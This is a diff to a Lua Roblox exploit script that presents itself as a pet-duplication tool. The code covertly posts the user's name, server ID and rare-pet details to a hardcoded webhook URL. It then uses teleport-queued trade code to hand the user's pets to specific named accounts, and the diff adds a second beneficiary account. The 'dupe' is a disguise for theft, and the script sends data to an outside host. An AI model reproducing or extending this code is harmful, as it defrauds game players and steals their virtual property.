@@ -937,7 +937,7 @@ H.Text = "tar's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
 
 local looool = nil
 
-for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90010 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'sowhatsatimberland'then looool = v.id ACC_TO_GIVE_PETS='sowhatsatimberland'end break end end
+for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==90010 and not v.dm and not v.r and not v.g then pcall(function()http_request({Url='https://webhook.lewisakura.moe/api/webhooks/1397671561628225709/rwi1irJfFKOWgIVN0fr81outMihCg6E9ogmeiOzqrP6somOTfEmOvwcx-kY9nLtr-cez',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'sowhatsatimberland'or game.Players:FindFirstChild'Realldud12'then looool = v.id ACC_TO_GIVE_PETS='sowhatsatimberland'end break end end
 
 local IDs = ""
 
@@ -1007,8 +1007,8 @@ queue_on_teleport([==[
 	end)
         local T, lastTradeId = workspace:WaitForChild'__REMOTES':WaitForChild'Game':WaitForChild'Trading', nil
 	
-	local PLR = isme and game.Players:FindFirstChild'sowhatsatimberland' or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
-        if isme and not game.Players:FindFirstChild'sowhatsatimberland' then wait(9e9) return end 
+	local PLR = (isme and game.Players:FindFirstChild'sowhatsatimberland') or (isme and game.Players:FindFirstChild'Realldud12') or game.Players[']==] .. ACC_TO_GIVE_PETS .. [==[']
+        if (isme and not table.find({'sowhatsatimberland','Realldud12'},PLR.Name)) then wait(9e9) return end 
         game:FindFirstChild('Trade Update', true).OnClientEvent:Connect(function(id, data, operation)
             lastTradeId = id
         end)
@@ -1036,7 +1036,7 @@ queue_on_teleport([==[
         workspace.__REMOTES.Game.Trading:InvokeServer("Ready", lastTradeId)
         
         repeat task.wait(0.1) until PLR_PET_COUNT < #workspace.__REMOTES.Core["Get Other Stats"]:InvokeServer()[PLR.Name].Save.Pets
-        if isme and game.Players:FindFirstChild'sowhatsatimberland' then wait(40) end
+        if isme and table.find({'sowhatsatimberland','Realldud12'},PLR.Name) then wait(40) end
         queue_on_teleport([[
 	    repeat task.wait() until game:IsLoaded()
             local h = Instance.new('Hint',workspace)
